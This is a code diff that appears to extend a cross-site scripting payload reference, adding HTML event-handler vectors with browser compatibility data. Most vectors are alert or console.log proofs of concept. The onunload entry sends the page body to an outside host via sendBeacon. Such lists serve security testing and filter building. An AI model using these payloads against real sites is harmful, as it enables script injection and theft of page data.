@@ -714,6 +714,341 @@ const additionalPayloads = [
             `<body onkeydown=console.log('Key: '+event.key) tabindex=0>`,
             `<div onkeydown=eval('alert(1)') tabindex=0>Press key</div>`
         ]
+    },
+    {
+        event: "onsecuritypolicyviolation",
+        description: "Fires when a CSP violation occurs. This would be site specific",
+        tag: "custom tags",
+        code: `<xss onsecuritypolicyviolation=alert(1)>XSS</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "no-interaction",
+        variations: [
+            `<div onsecuritypolicyviolation=alert('CSP Violation')>`,
+            `<span onsecuritypolicyviolation=console.log('CSP triggered')>`
+        ]
+    },
+    {
+        event: "onsuspend",
+        description: "Fires when the video/audio when the data loading is suspended",
+        tag: "audio",
+        code: `<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "media-events",
+        variations: [
+            `<audio onsuspend=alert('Audio suspended')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
+            `<video onsuspend=console.log('Video suspended')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
+        ]
+    },
+    {
+        event: "ontimeupdate",
+        description: "Fires when the timeline is changed",
+        tag: "audio",
+        code: `<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "media-events",
+        variations: [
+            `<audio ontimeupdate=alert('Time updated')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
+            `<video ontimeupdate=console.log('Video time update')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
+        ]
+    },
+    {
+        event: "ontoggle",
+        description: "Fires when the details tag is expanded",
+        tag: "details",
+        code: `<details ontoggle=alert(1) open>test</details>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "auto-events",
+        variations: [
+            `<details ontoggle=alert('Details toggled') open>Click to expand</details>`,
+            `<details ontoggle=console.log('Toggle event')><summary>Toggle</summary>Content</details>`
+        ]
+    },
+    {
+        event: "ontransitionend",
+        description: "Fires when a CSS transition ends",
+        tag: "custom tags",
+        code: `<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: false,
+            safari: false
+        },
+        category: "animation-events",
+        variations: [
+            `<div style="transition:opacity 0.1s" ontransitionend=alert('Transition ended') id=x tabindex=1></div>`,
+            `<span style="transition:color 0.5s" ontransitionend=console.log('Color transition done')></span>`
+        ]
+    },
+    {
+        event: "ontransitionstart",
+        description: "Fires when a CSS transition starts",
+        tag: "custom tags",
+        code: `<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>`,
+        compatibility: {
+            chrome: false,
+            firefox: false,
+            safari: true
+        },
+        category: "animation-events",
+        variations: [
+            `<style>:target{background:blue}</style><div id=x style="transition:background 0.5s" ontransitionstart=alert('Transition started')></div>`
+        ]
+    },
+    {
+        event: "onunhandledrejection",
+        description: "Fires when a promise isn't handled",
+        tag: "body",
+        code: `<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>`,
+        compatibility: {
+            chrome: false,
+            firefox: true,
+            safari: false
+        },
+        category: "no-interaction",
+        variations: [
+            `<body onunhandledrejection=alert('Unhandled Promise')><script>Promise.reject('error')</script></body>`,
+            `<body onunhandledrejection=console.log('Promise rejection')><script>fetch('//nonexistent')</script></body>`
+        ]
+    },
+    {
+        event: "onunload",
+        description: "Fires when the page is unloaded",
+        tag: "body",
+        code: `<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: false
+        },
+        category: "no-interaction",
+        variations: [
+            `<body onunload=alert('Page unloading')>`,
+            `<body onunload=console.log('Page unload event')>`
+        ]
+    },
+    {
+        event: "onwebkitanimationend",
+        description: "Fires when a CSS animation ends",
+        tag: "custom tags",
+        code: `<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: false,
+            safari: true
+        },
+        category: "animation-events",
+        variations: [
+            `<style>@keyframes webkit{to{opacity:0}}</style><div style="animation:webkit 0.1s" onwebkitanimationend=alert('WebKit animation end')></div>`
+        ]
+    },
+    {
+        event: "onwebkitanimationstart",
+        description: "Fires when a CSS animation starts",
+        tag: "custom tags",
+        code: `<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: false,
+            safari: true
+        },
+        category: "animation-events",
+        variations: [
+            `<style>@keyframes webkit{to{transform:scale(2)}}</style><div style="animation:webkit 1s" onwebkitanimationstart=alert('WebKit animation start')></div>`
+        ]
+    },
+    {
+        event: "oncontextmenu",
+        description: "Triggered when right clicking to show the context menu",
+        tag: "custom tags",
+        code: `<xss oncontextmenu="alert(1)" style=display:block>test</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<div oncontextmenu=alert('Right click') style="padding:20px;border:1px solid">Right click me</div>`,
+            `<img oncontextmenu=console.log('Image right click') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='100' height='50'/></svg>">`
+        ]
+    },
+    {
+        event: "ondblclick",
+        description: "Triggered when double clicking the element",
+        tag: "custom tags",
+        code: `<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<div ondblclick=alert('Double click') style="padding:20px;border:1px solid;cursor:pointer">Double click me</div>`,
+            `<button ondblclick=console.log('Button double click')>Double click button</button>`
+        ]
+    },
+    {
+        event: "ondrag",
+        description: "Triggered dragging the element",
+        tag: "custom tags",
+        code: `<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<div draggable="true" ondrag=alert('Dragging') style="padding:20px;border:1px solid;cursor:move">Drag me</div>`,
+            `<img draggable="true" ondrag=console.log('Image drag') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='100' height='50'/></svg>">`
+        ]
+    },
+    {
+        event: "ondrop",
+        description: "Triggered dropping a draggable element",
+        tag: "custom tags",
+        code: `<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<div draggable="true" style="padding:10px;border:1px solid;margin:10px">Drag me</div><div ondrop=alert('Dropped') style="padding:20px;border:2px dashed;min-height:50px">Drop zone</div>`
+        ]
+    },
+    {
+        event: "oninput",
+        description: "Requires as change of value",
+        tag: "input",
+        code: `<input oninput=alert(1) value=xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<input oninput=alert('Input changed') placeholder="Type something">`,
+            `<textarea oninput=console.log('Textarea input') placeholder="Type here"></textarea>`,
+            `<input type="range" oninput=alert('Range: '+this.value) min="0" max="100">`
+        ]
+    },
+    {
+        event: "onchange",
+        description: "Requires as change of value",
+        tag: "input",
+        code: `<input onchange=alert(1) value=xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<select onchange=alert('Selection: '+this.value)><option>Option 1</option><option>Option 2</option></select>`,
+            `<input type="checkbox" onchange=alert('Checkbox: '+this.checked)>`,
+            `<input type="file" onchange=alert('File selected')>`
+        ]
+    },
+    {
+        event: "onsubmit",
+        description: "Requires a form submission",
+        tag: "form",
+        code: `<form onsubmit=alert(1)><input type=submit></form>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<form onsubmit=alert('Form submitted')><input type="text" placeholder="Enter data"><input type="submit" value="Submit"></form>`,
+            `<form onsubmit=console.log('Form data submitted')><textarea placeholder="Enter message"></textarea><button type="submit">Send</button></form>`
+        ]
+    },
+    {
+        event: "onmouseover",
+        description: "Requires a hover over the element",
+        tag: "custom tags",
+        code: `<xss onmouseover="alert(1)" style=display:block>test</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<div onmouseover=alert('Mouse over') style="padding:20px;border:1px solid">Hover over me</div>`,
+            `<span onmouseover=console.log('Hover event') style="background:yellow">Hover text</span>`,
+            `<img onmouseover=alert('Image hover') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='100' height='50'/></svg>">`
+        ]
+    },
+    {
+        event: "onmouseout",
+        description: "Triggered when the mouse is moved away from the element",
+        tag: "custom tags",
+        code: `<xss onmouseout="alert(1)" style=display:block>test</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<div onmouseout=alert('Mouse out') style="padding:20px;border:1px solid">Move mouse away</div>`,
+            `<span onmouseout=console.log('Mouse left') style="background:red;color:white">Mouse leave text</span>`
+        ]
+    },
+    {
+        event: "onwheel",
+        description: "Fires when the mouse wheel scrolls",
+        tag: "custom tags",
+        code: `<xss onwheel=alert(1) style=display:block>scroll wheel over me</xss>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<div onwheel=alert('Wheel scroll') style="padding:50px;border:1px solid">Scroll wheel here</div>`,
+            `<textarea onwheel=console.log('Wheel in textarea') rows="5" cols="30">Scroll in textarea</textarea>`
+        ]
+    },
+    {
+        event: "onselect",
+        description: "Requires you select text",
+        tag: "input",
+        code: `<input onselect=alert(1) value="XSS" autofocus>`,
+        compatibility: {
+            chrome: true,
+            firefox: true,
+            safari: true
+        },
+        category: "user-interaction",
+        variations: [
+            `<textarea onselect=alert('Text selected') autofocus>Select this text</textarea>`,
+            `<input onselect=console.log('Selection made') value="Select me">`
+        ]
     }
 ];
 
